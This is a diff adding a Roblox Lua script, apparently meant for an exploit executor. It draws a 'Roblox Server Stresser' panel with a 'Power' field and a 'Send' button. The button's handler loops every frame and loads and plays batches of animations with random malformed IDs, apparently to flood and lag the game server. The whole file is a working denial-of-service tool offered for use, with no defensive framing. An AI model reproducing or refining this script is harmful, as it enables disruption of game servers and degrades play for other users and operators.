@@ -1,0 +1,64 @@
+﻿ScreenGui = Instance.new("ScreenGui")
+main = Instance.new("Frame")
+TextLabel = Instance.new("TextLabel")
+se = Instance.new("TextButton")
+Power = Instance.new("TextBox")
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.new(0.580392, 1, 0.239216)
+main.Position = UDim2.new(0.68364197, 0, 0.704410017, 0)
+main.Size = UDim2.new(0, 361, 0, 205)
+main.Active = true
+main.Draggable = true
+
+TextLabel.Parent = main
+TextLabel.BackgroundColor3 = Color3.new(0.482353, 0.827451, 0.196078)
+TextLabel.Position = UDim2.new(0, 0, -0.243902445, 0)
+TextLabel.Size = UDim2.new(0, 361, 0, 50)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.FontSize = Enum.FontSize.Size28
+TextLabel.Text = "Roblox Server Stresser"
+TextLabel.TextColor3 = Color3.new(0, 0, 0)
+TextLabel.TextSize = 28
+
+se.Name = "se"
+se.Parent = main
+se.BackgroundColor3 = Color3.new(0.580392, 1, 0.239216)
+se.Position = UDim2.new(0.221606642, 0, 0.560975671, 0)
+se.Size = UDim2.new(0, 200, 0, 50)
+se.Font = Enum.Font.SourceSansItalic
+se.FontSize = Enum.FontSize.Size60
+se.Text = "Send"
+se.TextColor3 = Color3.new(0, 0, 0)
+se.TextSize = 49
+se.MouseButton1Down:connect(function()
+
+
+local lag_strength = Power.Text
+
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+while game:GetService("RunService").RenderStepped:Wait() do
+    for i = 1, lag_strength do
+        local anim = Instance.new("Animation")
+        anim.AnimationId = "init\n"..math.random()
+        LocalPlayer.Character.Humanoid:LoadAnimation(anim):Play()
+        anim:Destroy()
+    end
+end
+end)
+
+Power.Name = "Power"
+Power.Parent = main
+Power.BackgroundColor3 = Color3.new(0.580392, 1, 0.239216)
+Power.Position = UDim2.new(0.221606642, 0, 0.160975605, 0)
+Power.Size = UDim2.new(0, 200, 0, 50)
+Power.Font = Enum.Font.Highway
+Power.FontSize = Enum.FontSize.Size28
+Power.Text = "Power"
+Power.TextColor3 = Color3.new(0, 0, 0)
+Power.TextSize = 25
+Power.TextWrapped = true
